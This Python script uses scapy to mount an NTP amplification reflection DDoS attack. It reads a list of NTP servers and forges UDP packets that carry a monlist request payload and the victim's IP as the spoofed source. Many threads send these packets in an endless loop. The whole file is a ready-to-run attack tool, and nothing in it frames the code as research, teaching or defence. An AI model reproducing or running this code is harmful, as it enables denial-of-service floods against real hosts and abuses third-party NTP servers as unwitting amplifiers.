from scapy.all import *
import random
import time
import sys
import threading

def attack():
	global NTPServer
	global ntpserver
	global rawData
	global target
	NTP = NTPServer[ntpserver] #store NTP server IP addresses
	ntpserver = ntpserver + 1 #traverse 
	packet = IP(dst=NTP,src=target)/UDP(sport=random.randint(50000,65500),dport=123)/Raw(load=rawData) #construct trash data
	send(packet,loop=1) 

def info():
	print "NTP Amplification reflection DDOS Attack"
	print "made by Zihao Li"
	exit(0)

try:
	if len(sys.argv) < 4:
		info()
	# define parameters of input
	target = sys.argv[1] #target hosts or servers

	NTPImported = sys.argv[2] #NTP server list achieved before
	definedThreads = int(sys.argv[3]) #define parallel threads
	NTPServer = []
	ntpserver = 0
	with open(NTPImported) as f:
	    NTPServer = f.readlines()

	if  definedThreads > int(len(NTPServer)):
		print "Threads defined should not be more than the number of NTP servers"
		exit(0)

	rawData = "\x17\x00\x03\x2a" + "\x00" * 80
	threads = []

	print "begin to attack: "+ target + " scan NTP server lists: " + NTPImported + " enable " + str(definedThreads) + " threads"
	print "CTRL+C to stop"

	for n in range(definedThreads):
	    thread = threading.Thread(target=attack)
	    thread.daemon = True
	    thread.start()
	    threads.append(thread)

	print "attacking..."

	while True:
		time.sleep(1)
except KeyboardInterrupt:
	print("attack stopped.. Shutting down")